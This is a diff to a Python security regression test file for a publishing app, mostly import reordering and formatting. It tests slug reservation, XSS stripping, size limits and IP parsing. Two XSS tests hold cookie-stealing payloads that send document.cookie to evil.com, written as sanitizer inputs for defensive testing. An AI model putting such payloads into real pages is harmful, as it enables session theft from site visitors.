@@ -1,11 +1,12 @@
 """Security regression tests — SQL injection, JSON-LD injection, reserved slugs, size limits."""
 
 import pytest
-from app.services.slug import generate_slug, is_reserved_slug, RESERVED_SLUGS
-from app.services.renderer import render_markdown
 
+from app.services.renderer import render_markdown
+from app.services.slug import generate_slug, is_reserved_slug
 
 # --- Reserved slugs ---
+
 
 def test_reserved_slugs_blocked():
     """All reserved slugs should be detected."""
@@ -40,6 +41,7 @@ def test_generate_slug_max_length():
 
 # --- XSS in rendered HTML ---
 
+
 def test_script_in_markdown_stripped():
     """Scripts in markdown content must not survive rendering."""
     content = "# Title\n\n<script>document.location='https://evil.com?c='+document.cookie</script>"
@@ -50,15 +52,17 @@ def test_script_in_markdown_stripped():
 
 def test_img_onerror_xss_stripped():
     """img onerror XSS must be stripped."""
-    html = render_markdown('# Test\n\n<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">')
+    html = render_markdown("# Test\n\n<img src=x onerror=\"fetch('https://evil.com?c='+document.cookie)\">")
     assert "onerror" not in html
 
 
 # --- Content size validation ---
 
+
 def test_schema_content_max_length():
     """PublishRequest should reject content exceeding 500K chars."""
     from app.schemas import PublishRequest
+
     with pytest.raises(Exception):  # ValidationError
         PublishRequest(
             title="Test",
@@ -69,6 +73,7 @@ def test_schema_content_max_length():
 def test_schema_subtitle_max_length():
     """PublishRequest should reject subtitle exceeding 1000 chars."""
     from app.schemas import PublishRequest
+
     with pytest.raises(Exception):  # ValidationError
         PublishRequest(
             title="Test",
@@ -79,7 +84,8 @@ def test_schema_subtitle_max_length():
 
 def test_schema_authors_max_count():
     """PublishRequest should reject more than 20 authors."""
-    from app.schemas import PublishRequest, AuthorInfo
+    from app.schemas import AuthorInfo, PublishRequest
+
     authors = [AuthorInfo(name=f"Author {i}") for i in range(21)]
     with pytest.raises(Exception):  # ValidationError
         PublishRequest(
@@ -91,9 +97,11 @@ def test_schema_authors_max_count():
 
 # --- IP detection utility ---
 
+
 def test_get_client_ip_forwarded():
     """get_client_ip should extract first IP from X-Forwarded-For."""
     from unittest.mock import MagicMock
+
     from app.utils import get_client_ip
 
     request = MagicMock()
@@ -106,6 +114,7 @@ def test_get_client_ip_forwarded():
 def test_get_client_ip_no_forwarded():
     """get_client_ip should fall back to request.client.host."""
     from unittest.mock import MagicMock
+
     from app.utils import get_client_ip
 
     request = MagicMock()
